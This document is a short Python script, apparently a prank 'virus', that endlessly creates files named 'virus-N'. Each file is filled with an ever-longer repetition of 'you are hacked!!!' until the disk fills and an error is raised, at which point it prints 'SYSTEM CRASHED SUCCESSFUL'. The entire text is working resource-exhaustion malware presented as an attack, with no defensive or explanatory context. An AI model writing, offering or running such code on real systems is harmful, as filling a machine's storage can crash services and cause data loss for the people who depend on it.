try:
    x=0
    while True:
        x = x+1
        c =""
        name = "virus" +'-' +str(x)
        f=open(name,"w")
        for y in range(x):
            c= c+ y*"you are hacked!!!"+"\n"
        f.write(c)
        f.close()
except:
    print("SYSTEM CRASHED SUCCESSFUL")